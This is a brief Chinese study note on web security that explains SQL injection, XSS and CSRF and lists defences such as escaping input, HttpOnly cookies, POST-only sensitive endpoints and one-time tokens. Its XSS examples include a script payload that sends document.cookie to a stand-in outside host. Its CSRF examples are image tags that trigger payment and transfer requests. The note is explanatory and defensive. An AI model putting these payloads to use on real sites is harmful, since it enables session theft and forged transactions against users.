---
date: '20180322'
---

# Web安全
## SQL注入
验证输入

## XSS (Cross Site Scripting, 跨站脚本攻击)
1. DOM Based XSS
假设网站的content内容是由query中content决定的. 将`http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>`这个链接通过邮件发给用户, 用户点击后会被盗取cookie信息;

2. Stored XSS
在某博客平台发表的文章中插入`<script>window.open(“www.b.com?param=”+document.cookie)</script>`

预防:
1. 字符替换用户输入的代码`<, >, &, ", ', / ....`;
2. cookie增加`http-only`限制, 禁止js操作
header头`set-Cookie: ..........; HttpOnly`

## CSRF (Cross-site request forgery, 跨站请求伪造)
CSRF 是借用了当前操作者的权限来偷偷地完成某个操作，而不是拿到用户的信息。

![csrf](../../assets/csrf.jpg)

例1:
一个用户已经登录了http://buy.com，在选择商品时，突然收到一封邮件，而这封邮件正文有这么一行代码`<img src="http://buy.com/pay?touid=999&money=100"/>`，他访问了邮件之后，其实就已经完成了购买。

例2:
银行网站A，它以GET请求来完成银行转账的操作，如：`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`
危险网站B，它里面有一段HTML的代码如下：
`<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>`
首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......

**CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！**

预防:
1. 涉及现金交易的肯定要输入密码或者指纹
2. 敏感接口使用POST而不是GET
3. one-Time Tokens(不同的表单包含一个不同的伪随机值)
>必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。
4. 验证码